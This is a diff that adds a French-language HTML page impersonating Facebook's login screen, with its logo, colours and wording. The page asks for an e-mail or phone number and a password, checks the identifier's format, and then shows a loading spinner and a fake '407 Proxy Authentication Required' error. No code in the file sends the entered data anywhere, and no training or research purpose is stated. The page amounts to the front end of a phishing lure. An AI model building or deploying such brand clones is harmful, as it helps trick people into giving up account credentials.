@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877F2'%3%3Cpath d='M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z'%3E%3C/path%3E%3C/svg%3E">
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .title-logo {
+            color: #1877f2;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: #1c1e21;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 22px 16px 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f5f6f7;
+            outline: none;
+        }
+
+        .input-group input.error-border {
+            border-color: #f02849;
+            background-color: #fff9fa;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 16px;
+            color: #8d949e;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 6px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* --- MESSAGE D'ERREUR --- */
+        #validation-error {
+            display: none; 
+            align-items: flex-start;
+            color: #f02849;
+            font-size: 14px;
+            text-align: left;
+            margin-top: -8px;
+            margin-bottom: 15px;
+            padding: 0 5px;
+            line-height: 1.4;
+        }
+
+        .error-icon-wrapper {
+            margin-right: 10px;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .find-account-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 4px;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0064e0;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        /* --- MOT DE PASSE OUBLIÉ : NOIR, MILIEU, BAS --- */
+        .forgot-link {
+            display: block;
+            color: #1c1e21;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .btn-create {
+            width: 100%;
+            background-color: transparent;
+            color: #0064e0;
+            border: 1px solid #0064e0;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 60px;
+        }
+
+        /* --- ÉCRANS --- */
+        #loading-screen, #error-panel {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-title { font-size: 100px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="login-ui">
+        <div class="title-logo">
+            <svg viewBox="0 0 24 24" fill="currentColor" width="70px" height="70px"><path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path></svg>
+        </div>
+        <h2>Se connecter à Facebook</h2>
+        
+        <form id="loginForm" novalidate>
+            <div class="input-group">
+                <input type="text" id="user_id" placeholder=" ">
+                <label>E-mail ou numéro de mobile</label>
+            </div>
+
+            <div id="validation-error">
+                <div class="error-icon-wrapper">
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="20px" height="20px"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"></path></svg>
+                </div>
+                <div>
+                    L’e-mail ou le numéro de mobile entré n’est pas associé à un compte.
+                    <span class="find-account-link" onclick="triggerLoading()">Trouvez votre compte et connectez-vous.</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder=" ">
+                <label>Mot de passe</label>
+            </div>
+            
+            <button type="submit" class="btn-login">Se connecter</button>
+
+            <a class="forgot-link" onclick="triggerLoading()">Mot de passe oublié ?</a>
+
+            <button type="button" class="btn-create" onclick="triggerLoading()">Créer un nouveau compte</button>
+        </form>
+    </div>
+
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; color: #8d949e;">Chargement en cours...</p>
+    </div>
+
+    <div id="error-panel">
+        <h1 class="error-title">407</h1>
+        <p><b>Proxy Authentication Required</b></p>
+        <button onclick="location.reload()" style="margin-top: 20px; padding: 10px; cursor: pointer;">Retour</button>
+    </div>
+
+    <script>
+        const loginUI = document.getElementById('login-ui');
+        const loadingScreen = document.getElementById('loading-screen');
+        const errorPanel = document.getElementById('error-panel');
+        const inputField = document.getElementById('user_id');
+        const errorMsg = document.getElementById('validation-error');
+
+        function triggerLoading() {
+            loginUI.style.display = 'none';
+            loadingScreen.style.display = 'flex';
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                errorPanel.style.display = 'flex';
+            }, 3000);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const val = inputField.value.trim(); // .trim() enlève les espaces vides
+
+            // SI LE CHAMP EST VIDE OU SI LE FORMAT EST MAUVAIS
+            const isNumber = /^\d+$/.test(val);
+            const hasAt = val.includes('@');
+
+            if (val === "" || (isNumber && val.length !== 10) || (!isNumber && !hasAt)) {
+                errorMsg.style.display = 'flex'; 
+                inputField.classList.add('error-border');
+            } else {
+                triggerLoading();
+            }
+        });
+
+        inputField.addEventListener('input', () => {
+            errorMsg.style.display = 'none';
+            inputField.classList.remove('error-border');
+        });
+    </script>
+</body>
+</html>
